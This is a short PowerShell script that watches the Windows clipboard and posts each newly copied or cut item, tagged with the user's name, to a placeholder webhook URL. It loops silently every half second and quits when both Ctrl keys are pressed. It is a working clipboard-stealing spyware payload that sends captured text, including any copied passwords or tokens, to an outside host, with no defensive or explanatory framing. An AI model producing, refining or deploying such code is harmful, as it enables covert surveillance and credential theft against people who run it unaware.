Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore

$hookUrl = 'VOTRE_URL_WEBHOOK'
$lastContent = ""

function dischat {
  [CmdletBinding()]
  param (    
  [Parameter (Position=0,Mandatory = $True)]
  [string]$con
  )   
  
  $Body = @{
    'username' = $env:username
    'content' = $con
  }

  Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
}

$initialClip = Get-Clipboard
if ($initialClip) {
    $lastContent = $initialClip
    dischat $initialClip
}

while (1){
    Start-Sleep -Milliseconds 500
    $currentClip = Get-Clipboard
    $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
    $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
    $cKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::c)
    $xKey = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::x)

    if (($Lctrl -or $Rctrl) -and ($xKey -or $cKey)) {
        if ($currentClip -and ($currentClip -ne $lastContent)) {
            $lastContent = $currentClip
            dischat $currentClip
        }
    }
    elseif ($Rctrl -and $Lctrl) { 
        dischat "---------connection lost----------"; exit 
    }
}
